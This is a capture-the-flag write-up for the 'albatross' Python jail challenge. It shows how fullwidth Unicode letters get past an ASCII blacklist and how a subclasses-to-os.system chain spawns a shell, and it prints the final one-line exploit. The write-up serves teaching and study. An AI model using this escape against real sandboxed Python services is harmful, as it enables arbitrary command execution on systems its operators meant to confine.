# albatross (11 solves)

Source: [albatross.py](./albatross.py)

_Note: I only fully solved this chall after the CTF ended_

We have to read the flag file in only 102 bytes without any ASCII letters or quotes. First, we need to defeat the blacklist. Google tells us that python identifiers use NFKC unicode normalization, meaning that we can use other variations to substitute for ASCII letters, such as fullwidth letters. This function will convert ASCII letters to fullwidth:

```python
import string
blacklist = string.ascii_letters + '"\' '
def clean(s):
	return "".join(chr(ord(c) + 0xfee0) if c in blacklist else c for c in s)
```

Next, we need to defeat the actual pyjail. The standard pyjail method uses `[].__class__.mro()[1].__subclasses__()` in order to get all the subclasses of the `object` class. One of these classes happens to be `os._wrap_close`. We can use it to access the `os` module through `[].__class__.mro()[1].__subclasses__()[127].close.__globals__`. In order to access the `system` function, we can convert the `__globals__` dictionary into a list of values and find the index of `system`: `[*[].__class__.mro()[1].__subclasses__()[127].close.__globals__.values()][42]`. In order to get the string `"sh"` we can slice the list docstring: `[].__doc__[91:97:5]`. Putting this all together gets us our final exploit.

Final Exploit: `[*[].__class__.mro()[1].__subclasses__()[127].close.__globals__.values()][42]([].__doc__[91:97:5])`
(after passing through the `clean` function)

Flag: `flag{SH\*T\*I_h0pe_ur_n0t_b1c...\_if_y0u\*@r3,\_th1\$\_isn't_th3_fl@g}`
